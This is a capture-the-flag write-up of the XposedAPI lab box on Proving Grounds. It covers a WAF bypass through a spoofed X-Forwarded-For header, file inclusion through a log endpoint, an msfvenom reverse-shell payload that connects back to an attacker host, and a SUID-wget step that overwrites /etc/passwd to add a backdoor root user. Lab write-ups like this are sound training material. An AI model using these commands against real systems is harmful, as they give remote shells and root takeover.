---
description: Writeup for XposedAPI from Offensive Security Proving Grounds (PG)
---

# XposedAPI

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.134.134 -t full`

`nmapAutomator.sh -H 192.168.134.134 -t vulns`

![](../../.gitbook/assets/525330a99c1c470a98a94b6d134c476b.png)

### Port 13337

![](../../.gitbook/assets/23e9e9de08f54734865735962e7a4323.png)

Seems like a custom-built API.

`/update` API seems interesting.

Generate ELF: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf`

It appears we need to either find a valid username, or perform SQL injection.

![](../../.gitbook/assets/dbe35877049f4b5aa6992e377bd03e10.png)

Another interesting endpoint is `/logs`. The WAF denies us access to this host. Likely, the WAF is trying to restrict access to localhost.

![](../../.gitbook/assets/14e256e5e4f64d17b6e0123f87ba812e.png)

### X-Forwarded-For Header

"The X-Forwarded-For \(XFF\) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used."

## Exploit

It appears that the WAF is performing a check on the X-Forwarded-For header. This can be easily manipulated on the client side.

![](../../.gitbook/assets/e0f9d6a10bde4648914d8228a2742216.png)

Now, we are told to use `file=/path/to/log/file`. This appears to be a LFI vulnerability.

![](../../.gitbook/assets/d9ecf1b7533e424fb514a557e1ba2562.png)

Here, we get the username `clumsyadmin` \(the only 'human' username\). Now we can make the server download and execute the malicious ELF file we generated earlier using msfvenom.

![](../../.gitbook/assets/a56214e1b7d241a489287f76bf027aa3.png)

Restart the app, and we have a reverse shell.

![](../../.gitbook/assets/8ecae4f1bbd943b4b9fac13e690a2f09.png)

![](../../.gitbook/assets/ba4d1a8bab2f4e1f8822bb3936534422.png)

## Privilege Escalation

We can use LinPEAS to enumerate.

![](../../.gitbook/assets/1d0ec02ef8e84eeeb6580ff1d5ceca98.png)

Very quickly, we can see that the SUID bit is set for `wget`.

Reference: [https://gtfobins.github.io/gtfobins/wget/](https://gtfobins.github.io/gtfobins/wget/)

We can abuse the SUID privileges to write arbitrary files.

After copying the `passwd` file to our attacking machine, add our own root user:

```bash
echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd
```

Note that this hash corresponds to our custom password, `mypass`.

```bash
$ openssl passwd mypass                                                    
bWBoOyE1sFaiQ
```

Then we can overwrite the existing `passwd` file: `wget http://192.168.49.134/passwd -O /etc/passwd`

![](../../.gitbook/assets/a07320d2d3114902b62c13cbe62dc50b.png)

Finally, we can SSH as root2.

![](../../.gitbook/assets/d94647f4a8274a248740ffd23bb067f8.png)

![](../../.gitbook/assets/b1af23d94a0044e5b570f87a99368bc2.png)

